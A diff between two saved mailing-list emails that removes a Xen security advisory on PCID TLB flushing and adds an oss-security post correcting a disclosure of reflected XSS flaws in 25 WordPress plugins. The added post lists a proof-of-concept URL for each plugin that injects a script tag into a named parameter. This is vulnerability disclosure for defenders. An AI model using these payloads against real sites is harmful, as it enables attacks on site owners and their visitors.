@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["13560" "Friday" "25" "October" "2019" "11:10:38" "+0000" "Xen.org security team" "security@xen.org" "<E1iNxUM-0002l3-Ex@xenbits.xenproject.org>" "290" "[oss-security] Xen Security Advisory 292 v3 (CVE-2019-17346) - x86: insufficient TLB flushing when using PCID" "^CC:" nil nil "10" "2019102511:10:38" "[oss-security] Xen Security Advisory 292 v3 (CVE-2019-17346) - x86: insufficient TLB flushing when using PCID" (number mark "U       security@xen Oct 25  290/13560 " thread-indent "\"[oss-security] Xen Security Advisory 292 v3 (CVE-2019-17346) - x86: insufficient TLB flushing when using PCID\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Xen Security Advisory 292 v3 (CVE-2019-17346) - x86: insufficient TLB flushing when using PCID" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7832" "Thursday" "14" "April" "2016" "13:07:58" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<51BCC5B5-7EC2-497C-992F-A3EBB8647DDF@me.com>" "132" "Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." nil nil nil "4" "2016041417:07:58" "[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." (number mark "U       larry0@me.co Apr 14  132/7832  " thread-indent "\"Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.\"\n") "<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>" ("<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1127 invoked by uid 550); 25 Oct 2019 11:10:56 -0000
+Received: (qmail 9795 invoked by uid 550); 14 Apr 2016 17:08:14 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,308 +11,164 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 1067 invoked from network); 25 Oct 2019 11:10:55 -0000
-Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
-Content-Transfer-Encoding: binary
-MIME-Version: 1.0
-X-Mailer: MIME-tools 5.508 (Entity 5.508)
-Message-Id: <E1iNxUM-0002l3-Ex@xenbits.xenproject.org>
-CC: Xen.org security team <security-team-members@xen.org>
-Date: Fri, 25 Oct 2019 11:10:38 +0000
-From: Xen.org security team <security@xen.org>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Xen Security Advisory 292 v3 (CVE-2019-17346) - x86: insufficient
- TLB flushing when using PCID
-To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
- xen-users@lists.xen.org, oss-security@lists.openwall.com
+Received: (qmail 9773 invoked from network); 14 Apr 2016 17:08:13 -0000
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2016-04-14_08:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1015 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1510270003 definitions=main-1604140240
+Content-type: text/plain; charset=us-ascii
+MIME-version: 1.0 (Mac OS X Mail 9.2 \(3112\))
+From: "Larry W. Cashdollar" <larry0@me.com>
+In-reply-to: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
+Date: Thu, 14 Apr 2016 13:07:58 -0400
+Content-transfer-encoding: quoted-printable
+Message-id: <51BCC5B5-7EC2-497C-992F-A3EBB8647DDF@me.com>
+References: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
+To: oss-security@lists.openwall.com
+X-Mailer: Apple Mail (2.3112)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1460653680; bh=WpSUnPn6ymBYxYcTKLHFdCentXj3VNl7Ho2cM2JKCBg=;
+	h=Content-type:MIME-version:Subject:From:Date:Message-id:To;
+	b=jcbQCRl4uI6mO8pqiJXGOlkZ7Ps3Z72YLcJ4RQmxCiPkpwEnHOgUVF0kcQKWIabB9
+ eS+d1KJnlFkqEwfbQs8JDWWgQ4TGgUIxRXuGKci/rtvuLFqdxFsIZBV+rCcmmrqwpM
+ 5gPD9VHgHxtKAcFcp98s9iBX9jN4OhHXOLszYo/+GasfrjCdB8lQ7AXBC3XT6DMnYz
+ fxjK2nh/Z3qXSIjMWI+K6fp58dKLyfjOB1gLJ9+JSBe65Xql3Spqgv00Ia9inBBN06
+ ciA32lmEuWI7RTW5BvT7MPU/HUB8izAov+DK0QU9QRck64fQ6dR/RGx1A03IOswGHE
+ aTAB7+wFYoraw==
+Subject: Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.
 
---=separator
-Content-Type: text/plain; charset="utf-8"
-Content-Disposition: inline
-Content-Transfer-Encoding: 7bit
+Hi List,
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+This morning I realized a flaw in my testing methodology, I used php5-cgi o=
+n the command line setting environment variables to pass the XSS payload
+to the vulnerable php code.  What I failed to realize is that if the plugin=
+ code was setting a content-header this would be missed when I used phantom=
+JS to render
+the html output and execute any JS I had injected.  The result is only 25 o=
+f the plugins are exploitable.  The other 14 aren't XSSable because they se=
+t the content header=20
+to something the browser doesn't render.  Here is a list of the remaining p=
+lugins.  I'm sorry for my mistake.
 
-            Xen Security Advisory CVE-2019-17346 / XSA-292
-                              version 3
+Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js/i=
+ndexisto-inject.php Parameter:indexisto_index CVEID:2016-77360 PoC:hxxp://[=
+target]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexis=
+to_index=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-plug=
+in.php Parameter:plugin CVEID:2016-77799 PoC:hxxp://[target]/wp-content/plu=
+gins/whizz/plugins/delete-plugin.php?plugin=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiarism=
+/js.php Parameter:m CVEID:2016-77035 PoC:hxxp://[target]/wp-content/plugins=
+/anti-plagiarism/js.php?m=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video-m=
+anagement/preview_video.php Parameter:media CVEID:2016-77600 PoC:hxxp://[ta=
+rget]/wp-content/plugins/s3-video/views/video-management/preview_video.php?=
+media=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-sea=
+rch-engine/classes/extensions/managed-solr-servers/templates/template-my-ac=
+counts.php Parameter:page  tab CVEID:2016-77958 PoC:hxxp://[target]/wp-cont=
+ent/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/te=
+mplates/template-my-accounts.php?page=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layout=
+-builder/includes/layout-settings.php Parameter:layout_settings_id CVEID:20=
+16-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/include=
+s/layout-settings.php?layout_settings_id=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_sel=
+ect.php Parameter:date-from date-to CVEID:2016-77217 PoC:hxxp://[target]/wp=
+-content/plugins/e-search/tmpl/date_select.php?date-from=3D"><script>alert(=
+1);</script><"
+Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_az=
+.php Parameter:title_az CVEID:2016-77217 PoC:hxxp://[target]/wp-content/plu=
+gins/e-search/tmpl/title_az.php?title_az=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/pop=
+up-insert-help.php Parameter:galleryId id  tidio-gallery CVEID:2016-77727 P=
+oC:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?g=
+alleryId=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php P=
+arameter:font size CVEID:2016-77506 PoC:hxxp://[target]/wp-content/plugins/=
+parsi-font/css.php?size=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./def=
+a-online-image-protector/redirect.php Parameter:r CVEID:2016-77193 PoC:hxxp=
+://[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r=
+=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-fire=
+work/firework/index.php Parameter:music text url CVEID:2016-77475 PoC:hxxp:=
+//[target]/wp-content/plugins/new-year-firework/firework/index.php?text=3D"=
+><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-reserv=
+eren/edit.php Parameter:page CVEID:2016-77628 PoC:hxxp://[target]/wp-conten=
+t/plugins/simpel-reserveren/edit.php?page=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-po=
+st/js.php Parameter:count interval CVEID:2016-77022 PoC:hxxp://[target]/wp-=
+content/plugins/ajax-random-post/js.php?interval=3D"><script>alert(1);</scr=
+ipt><"
+Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-ed=
+itor/css.php Parameter:font size CVEID:2016-77009 PoC:hxxp://[target]/wp-co=
+ntent/plugins/admin-font-editor/css.php?size=3D"><script>alert(1);</script>=
+<"
+Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.php =
+Parameter:playlist CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
+hdw-tube/playlist.php?playlist=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.php=
+ Parameter:channel CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
+hdw-tube/mychannel.php?channel=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/vie=
+ws/dashboard/index.php Parameter:p v CVEID:2016-77341 PoC:hxxp://[target]/w=
+p-content/plugins/hero-maps-pro/views/dashboard/index.php?v=3D"><script>ale=
+rt(1);</script><"
+Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
+inc/pages/edit_styles.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target=
+]/wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid=3D"><=
+script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
+inc/pages/build.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target]/wp-c=
+ontent/plugins/photoxhibit/common/inc/pages/build.php?gid=3D"><script>alert=
+(1);</script><"
+Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formmail=
+/pages/admin-mail-info.php Parameter:itemid CVEID:2016-77532 PoC:hxxp://[ta=
+rget]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=
+=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-tr=
+ackr_abtest_add.php Parameter:id N  WPSLT CVEID:2016-77339 PoC:hxxp://[targ=
+et]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=3D"><scrip=
+t>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-ins=
+ert-help.php Parameter:formId id  tidio-form CVEID:2016-77726 PoC:hxxp://[t=
+arget]/wp-content/plugins/tidio-form/popup-insert-help.php?formId=3D"><scri=
+pt>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/simplified-content File:./simplified-c=
+ontent/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVEID:2016-7=
+7642 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframewo=
+rk/js/ajax/OOAAjax.js.php?ajaxURL=3D"><script>alert(1);</script><"
+Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Infus=
+ionsoft/examples/leadscoring.php Parameter:ContactId CVEID:2016-77364 PoC:h=
+xxp://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadsc=
+oring.php?ContactId=3D"><script>alert(1);</script><"
 
-            x86: insufficient TLB flushing when using PCID
+Advisories here: http://www.vapidlabs.com/wp/wp.php
 
-UPDATES IN VERSION 3
-====================
 
-CVE assigned.
+Again my apologies,
+Larry
 
-ISSUE DESCRIPTION
-=================
 
-Use of Process Context Identifiers (PCID) was introduced into Xen in
-order to improve performance after XSA-254 (and in particular its
-Meltdown sub-issue).  This enablement implied changes to the TLB
-flushing logic.  The particular case of context switch to a vCPU of a
-PCID-enabled guest left open a time window between the full TLB flush,
-and the actual address space switch, during which additional TLB
-entries (from the address space about to be switched away from) can be
-accumulated, which will not subsequently be purged.
+> On Apr 12, 2016, at 8:48 AM, Larry W. Cashdollar <larry0@me.com> wrote:
+>=20
+> Hello List,
+>=20
+>=20
+> This was a project I worked on as part of my research in Akamai's SIRT, I=
+ initially found 1352 suspect XSS vulnerabilities but Wordpress escapes sup=
+er globals GET/POST/REQUEST
+> https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the =
+time, so now I have a database of vulnerabilities that are context dependen=
+t and would need to be examined
+> individually.  I managed to automate XSS testing against the database and=
+ of 1352 39 successfully executed javascript.  These are those 39, I've man=
+ually verified they're still vulnerable.
+>=20
+> They're available here http://www.vapidlabs.com/wp/wp.php
 
-IMPACT
-======
-
-Malicious PV guests may be able to cause a host crash (Denial of
-Service) or to gain access to data pertaining to other guests.
-Privilege escalation opportunities cannot be ruled out.
-
-Additionally, vulnerable configurations are likely to be unstable even
-in the absence of an attack.
-
-VULNERABLE SYSTEMS
-==================
-
-Only x86 systems are vulnerable.  ARM systems are not vulnerable.
-
-Only systems running x86 PV guests are vulnerable.  Systems running
-only x86 HVM or PVH guests are not vulnerable.
-
-Only systems with at least one PCID-enabled PV guest are vulnerable.
-
-Systems where PCID or INVPCID are unavailable or entirely disabled are
-not vulnerable.
-
-Note that PCID is enabled by default for both 64-bit dom0 and 64-bit
-domU when hardware supports it.  PCID acceleration has been backported
-to the following versions:
- - Xen 4.11.x,
- - Xen 4.10.2 and onwards,
- - Xen 4.9.3 and onwards,
- - Xen 4.8.4 and onwards,
- - Xen 4.7.6.
-
-To exploit this vulnerability, problematic TLB entries must be created
-between the full TLB flush and the address space switch.  The NMI
-watchdog handler (enabled via the "watchdog" command line option) is
-known to create such entries; other vectors cannot be ruled out.
-
-MITIGATION
-==========
-
-Running only HVM or PVH guests will avoid this vulnerability.
-
-Running only 32-bit PV guests alongside the other two types mentioned
-above will also avoid this vulnerability, provided Dom0 is also 32-bit
-or is not using PCID.  Making a 64-bit Dom0 not use PCID can be achieved
-by e.g. "xpti=no-dom0 pcid=xpti".
-
-Disabling use of PCID entirely, by passing "pcid=0" or "invpcid=0" as a
-command line option to the hypervisor, will also avoid this
-vulnerability (albeit re-introducing the XPTI performance regression
-use of PCID was intended to reduce).
-
-Disabling the watchdog timer will remove the only known way of reliably
-creating problematic TLB entries, potentially reducing the risk of a
-successful attack.
-
-CREDITS
-=======
-
-This issue was discovered by Sergey Dyasli and Andrew Cooper of Citrix.
-
-RESOLUTION
-==========
-
-Applying the attached patch resolves this issue.
-
-xsa292.patch           xen-unstable, Xen 4.11.x ... Xen 4.7.6
-
-$ sha256sum xsa292*
-c515e98e5ae8a16bc5c894741eea5523a7e568f81ee8a570626dcc0f58f40b40  xsa292.meta
-f42cb5e1eae5a5c6f0fd84e38df4db9f09a4e1176905c37f292fef9855c82fea  xsa292.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
-
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
-
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-
-iQFABAEBCAAqFiEEI+MiLBRfRHX6gGCng/4UyVfoK9kFAl2y1+cMHHBncEB4ZW4u
-b3JnAAoJEIP+FMlX6CvZV48H/i1Wi6DV90quHvewv0j792crdJojnHgq/8V3+hfT
-lXWcmfW5IQLi02o4aG7XjUYwRTQ6clRgF4AZDZyrAY15QyVCz9diusvWOUzaq7Pd
-hrvuIMeaB3+ba2OY7bB3P0sCekhhj6MwqKEhGVlbLEB8A0vGq9XjZBuTmws6QA2J
-6Il8fxEVupdtETsf3KlYfxvJOubN/B+tByaIpdWU0C2M66EVa4pcijSLcvoylGxi
-YS7jJrSMcqg4Sx/e/HnzCJ7jrvzhxSDHeyhPy1/NrwlQz2NQjd+FoFownsH48LuH
-6LA6GGTIk5v+a/GtNVpb8Wwfg0UleabF+8S30C6QasUO70E=
-=Pk5K
------END PGP SIGNATURE-----
-
---=separator
-Content-Type: application/octet-stream; name="xsa292.meta"
-Content-Disposition: attachment; filename="xsa292.meta"
-Content-Transfer-Encoding: base64
-
-ewogICJYU0EiOiAyOTIsCiAgIlN1cHBvcnRlZFZlcnNpb25zIjogWwogICAg
-Im1hc3RlciIsCiAgICAiNC4xMSIsCiAgICAiNC4xMCIsCiAgICAiNC45IiwK
-ICAgICI0LjgiLAogICAgIjQuNyIKICBdLAogICJUcmVlcyI6IFsKICAgICJ4
-ZW4iCiAgXSwKICAiUmVjaXBlcyI6IHsKICAgICI0LjEwIjogewogICAgICAi
-UmVjaXBlcyI6IHsKICAgICAgICAieGVuIjogewogICAgICAgICAgIlN0YWJs
-ZVJlZiI6ICJhMDE2YjhmMjA3YzdhM2ZlOGJkZDJiNmY3YzA4MDAyMGUzZTFj
-ODIzIiwKICAgICAgICAgICJQcmVyZXFzIjogWwogICAgICAgICAgICAyODQs
-CiAgICAgICAgICAgIDI4NSwKICAgICAgICAgICAgMjg3LAogICAgICAgICAg
-ICAyODgsCiAgICAgICAgICAgIDI5MCwKICAgICAgICAgICAgMjkxCiAgICAg
-ICAgICBdLAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAgICAgICAgICJ4
-c2EyOTIucGF0Y2giCiAgICAgICAgICBdCiAgICAgICAgfQogICAgICB9CiAg
-ICB9LAogICAgIjQuMTEiOiB7CiAgICAgICJSZWNpcGVzIjogewogICAgICAg
-ICJ4ZW4iOiB7CiAgICAgICAgICAiU3RhYmxlUmVmIjogIjg3ZjUxYmYzNjZj
-YTc5Yjk4ZTFlMjAxYmY5YmQ3YTljMTY0NjMxZTIiLAogICAgICAgICAgIlBy
-ZXJlcXMiOiBbCiAgICAgICAgICAgIDI4NCwKICAgICAgICAgICAgMjg1LAog
-ICAgICAgICAgICAyODcsCiAgICAgICAgICAgIDI4OCwKICAgICAgICAgICAg
-MjkwLAogICAgICAgICAgICAyOTEKICAgICAgICAgIF0sCiAgICAgICAgICAi
-UGF0Y2hlcyI6IFsKICAgICAgICAgICAgInhzYTI5Mi5wYXRjaCIKICAgICAg
-ICAgIF0KICAgICAgICB9CiAgICAgIH0KICAgIH0sCiAgICAiNC43Ijogewog
-ICAgICAiUmVjaXBlcyI6IHsKICAgICAgICAieGVuIjogewogICAgICAgICAg
-IlN0YWJsZVJlZiI6ICI3MTBjYzA5Njk3MTAxOWJjMmU1YTlhYWJiOWFmMWFj
-Y2EwYjViOWU3IiwKICAgICAgICAgICJQcmVyZXFzIjogWwogICAgICAgICAg
-ICAyODQsCiAgICAgICAgICAgIDI4NSwKICAgICAgICAgICAgMjg3LAogICAg
-ICAgICAgICAyODgsCiAgICAgICAgICAgIDI5MAogICAgICAgICAgXSwKICAg
-ICAgICAgICJQYXRjaGVzIjogWwogICAgICAgICAgICAieHNhMjkyLnBhdGNo
-IgogICAgICAgICAgXQogICAgICAgIH0KICAgICAgfQogICAgfSwKICAgICI0
-LjgiOiB7CiAgICAgICJSZWNpcGVzIjogewogICAgICAgICJ4ZW4iOiB7CiAg
-ICAgICAgICAiU3RhYmxlUmVmIjogIjkwOGU3NjhmYWU0OWE4ZGIwMDg5ZTY4
-MTg4NjUyMDc5ZTNiZmFhNjYiLAogICAgICAgICAgIlByZXJlcXMiOiBbCiAg
-ICAgICAgICAgIDI4NCwKICAgICAgICAgICAgMjg1LAogICAgICAgICAgICAy
-ODcsCiAgICAgICAgICAgIDI4OCwKICAgICAgICAgICAgMjkwLAogICAgICAg
-ICAgICAyOTEKICAgICAgICAgIF0sCiAgICAgICAgICAiUGF0Y2hlcyI6IFsK
-ICAgICAgICAgICAgInhzYTI5Mi5wYXRjaCIKICAgICAgICAgIF0KICAgICAg
-ICB9CiAgICAgIH0KICAgIH0sCiAgICAiNC45IjogewogICAgICAiUmVjaXBl
-cyI6IHsKICAgICAgICAieGVuIjogewogICAgICAgICAgIlN0YWJsZVJlZiI6
-ICJmNWFjZjk3ZjY2OWM2YmM5NjkxZTAzNzcxYWQwNjcwM2RhNzdlMGQ1IiwK
-ICAgICAgICAgICJQcmVyZXFzIjogWwogICAgICAgICAgICAyODQsCiAgICAg
-ICAgICAgIDI4NSwKICAgICAgICAgICAgMjg3LAogICAgICAgICAgICAyODgs
-CiAgICAgICAgICAgIDI5MCwKICAgICAgICAgICAgMjkxCiAgICAgICAgICBd
-LAogICAgICAgICAgIlBhdGNoZXMiOiBbCiAgICAgICAgICAgICJ4c2EyOTIu
-cGF0Y2giCiAgICAgICAgICBdCiAgICAgICAgfQogICAgICB9CiAgICB9LAog
-ICAgIm1hc3RlciI6IHsKICAgICAgIlJlY2lwZXMiOiB7CiAgICAgICAgInhl
-biI6IHsKICAgICAgICAgICJTdGFibGVSZWYiOiAiMjRkNTI4MjUyN2Y0NjQ3
-OTA3YjM1NzI4MjBiNTMzNWMxNWNkMDM1NiIsCiAgICAgICAgICAiUHJlcmVx
-cyI6IFsKICAgICAgICAgICAgMjg0LAogICAgICAgICAgICAyODUsCiAgICAg
-ICAgICAgIDI4NywKICAgICAgICAgICAgMjg4LAogICAgICAgICAgICAyOTAs
-CiAgICAgICAgICAgIDI5MQogICAgICAgICAgXSwKICAgICAgICAgICJQYXRj
-aGVzIjogWwogICAgICAgICAgICAieHNhMjkyLnBhdGNoIgogICAgICAgICAg
-XQogICAgICAgIH0KICAgICAgfQogICAgfQogIH0KfQ==
-
---=separator
-Content-Type: application/octet-stream; name="xsa292.patch"
-Content-Disposition: attachment; filename="xsa292.patch"
-Content-Transfer-Encoding: base64
-
-RnJvbTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpTdWJqZWN0
-OiB4ODYvbW06IHByb3Blcmx5IGZsdXNoIFRMQiBpbiBzd2l0Y2hfY3IzX2Ny
-NCgpCgpUaGUgQ1IzIHZhbHVlcyB1c2VkIGZvciBjb250ZXh0cyBydW4gd2l0
-aCBQQ0lEIGVuYWJsZWQgdW5pZm9ybWx5IGhhdmUKQ1IzLk5PRkxVU0ggc2V0
-LCByZXN1bHRpbmcgaW4gdGhlIENSMyB3cml0ZSBpdHNlbGYgdG8gbm90IGNh
-dXNlIGFueQpmbHVzaGluZyBhdCBhbGwuIFdoZW4gdGhlIHNlY29uZCBDUjQg
-d3JpdGUgaXMgc2tpcHBlZCBvciBkb2Vzbid0IGRvIGFueQpmbHVzaGluZywg
-dGhlcmUncyBub3RoaW5nIHNvIGZhciB3aGljaCB3b3VsZCBwdXJnZSBUTEIg
-ZW50cmllcyB3aGljaCBtYXkKaGF2ZSBhY2N1bXVsYXRlZCBhZ2FpbiBpZiB0
-aGUgUENJRCBkb2Vzbid0IGNoYW5nZTsgdGhlICJqdXN0IGluIGNhc2UiCmZs
-dXNoIG9ubHkgYWZmZWN0cyB0aGUgY2FzZSB3aGVyZSB0aGUgUENJRCBhY3R1
-YWxseSBjaGFuZ2VzLiAoVGhlcmUgbWF5CmJlIHBhcnRpY3VsYXJseSBtYW55
-IFRMQiBlbnRyaWVzIHJlLWFjY3VtdWxhdGVkIGluIGNhc2Ugb2YgYSB3YXRj
-aGRvZwpOTUkga2lja2luZyBpbiBkdXJpbmcgdGhlIGNyaXRpY2FsIHRpbWUg
-d2luZG93LikKClN1cHByZXNzIHRoZSBuby1mbHVzaCBiZWhhdmlvciBvZiB0
-aGUgQ1IzIHdyaXRlIGluIHRoaXMgcGFydGljdWxhciBjYXNlLgoKU2ltaWxh
-cmx5IHRoZSBzZWNvbmQgQ1I0IHdyaXRlIG1heSBub3QgY2F1c2UgYW55IGZs
-dXNoaW5nIG9mIFRMQiBlbnRyaWVzCmVzdGFibGlzaGVkIGFnYWluIHdoaWxl
-IHRoZSBvcmlnaW5hbCBQQ0lEIHdhcyBzdGlsbCBpbiB1c2UgLSBpdCBtYXkg
-Z2V0CnBlcmZvcm1lZCBiZWNhdXNlIG9mIHVucmVsYXRlZCBiaXRzIGNoYW5n
-aW5nLiBUaGUgZmx1c2ggb2YgdGhlIG9sZCBQQ0lECm5lZWRzIHRvIGhhcHBl
-biBuZXZlcnRoZWxlc3MuCgpBdCB0aGUgc2FtZSB0aW1lIGFsc28gZWxpbWlu
-YXRlIGEgcG9zc2libGUgcmFjZSB3aXRoIGxhenkgY29udGV4dApzd2l0Y2g6
-IEp1c3QgbGlrZSBmb3IgQ1I0LCBDUjMgbWF5IGNoYW5nZSBhdCBhbnkgdGlt
-ZSB3aGlsZSBpbnRlcnJ1cHRzCmFyZSBlbmFibGVkLCBkdWUgdG8gdGhlIF9f
-c3luY19sb2NhbF9leGVjc3RhdGUoKSBpbnZvY2F0aW9uIGZyb20gdGhlCmZs
-dXNoIElQSSBoYW5kbGVyLiBJdCBpcyBmb3IgdGhhdCByZWFzb24gdGhhdCB0
-aGUgQ1IzIHJlYWQsIGp1c3QgbGlrZQp0aGUgQ1I0IG9uZSwgbXVzdCBoYXBw
-ZW4gb25seSBhZnRlciBpbnRlcnJ1cHRzIGhhdmUgYmVlbiB0dXJuZWQgb2Zm
-LgoKVGhpcyBpcyBYU0EtMjkyLgoKUmVwb3J0ZWQtYnk6IFNlcmdleSBEeWFz
-bGkgPHNlcmdleS5keWFzbGlAY2l0cml4LmNvbT4KUmVwb3J0ZWQtYnk6IEFu
-ZHJldyBDb29wZXIgPGFuZHJldy5jb29wZXIzQGNpdHJpeC5jb20+ClRlc3Rl
-ZC1ieTogU2VyZ2V5IER5YXNsaSA8c2VyZ2V5LmR5YXNsaUBjaXRyaXguY29t
-PgpTaWduZWQtb2ZmLWJ5OiBKYW4gQmV1bGljaCA8amJldWxpY2hAc3VzZS5j
-b20+ClJldmlld2VkLWJ5OiBBbmRyZXcgQ29vcGVyIDxhbmRyZXcuY29vcGVy
-M0BjaXRyaXguY29tPgotLS0KdjM6IEFkanVzdCBjb21tZW50cy4gRHJvcCBv
-bGRfY3I0IGZyb20gdGhlIFBHRSBjaGVjayBpbiB0aGUgZXhwcmVzc2lvbgog
-ICAgY29udHJvbGxpbmcgdGhlIGludm9jYXRpb24gb2YgaW52cGNpZF9mbHVz
-aF9zaW5nbGVfY29udGV4dCgpLCBhcyBQR0UKICAgIGlzIGFsd2F5cyBjbGVh
-ciB0aGVyZS4KdjI6IERlY291cGxlIGludnBjaWRfZmx1c2hfc2luZ2xlX2Nv
-bnRleHQoKSBmcm9tIDJuZCBDUjQgd3JpdGUuCgotLS0gYS94ZW4vYXJjaC94
-ODYvZmx1c2h0bGIuYworKysgYi94ZW4vYXJjaC94ODYvZmx1c2h0bGIuYwpA
-QCAtMTAzLDkgKzEwMyw4IEBAIHN0YXRpYyB2b2lkIGRvX3RsYl9mbHVzaCh2
-b2lkKQogCiB2b2lkIHN3aXRjaF9jcjNfY3I0KHVuc2lnbmVkIGxvbmcgY3Iz
-LCB1bnNpZ25lZCBsb25nIGNyNCkKIHsKLSAgICB1bnNpZ25lZCBsb25nIGZs
-YWdzLCBvbGRfY3I0OworICAgIHVuc2lnbmVkIGxvbmcgZmxhZ3MsIG9sZF9j
-cjQsIG9sZF9wY2lkOwogICAgIHUzMiB0OwotICAgIHVuc2lnbmVkIGxvbmcg
-b2xkX3BjaWQgPSBjcjNfcGNpZChyZWFkX2NyMygpKTsKIAogICAgIC8qIFRo
-aXMgbm9uLXJlZW50cmFudCBmdW5jdGlvbiBpcyBzb21ldGltZXMgY2FsbGVk
-IGluIGludGVycnVwdCBjb250ZXh0LiAqLwogICAgIGxvY2FsX2lycV9zYXZl
-KGZsYWdzKTsKQEAgLTEzMywxNSArMTMyLDM4IEBAIHZvaWQgc3dpdGNoX2Ny
-M19jcjQodW5zaWduZWQgbG9uZyBjcjMsIHUKICAgICAgICAgICovCiAgICAg
-ICAgIGludnBjaWRfZmx1c2hfYWxsX25vbmdsb2JhbHMoKTsKIAorICAgIC8q
-CisgICAgICogSWYgd2UgZG9uJ3QgY2hhbmdlIFBDSURzLCB0aGUgQ1IzIHdy
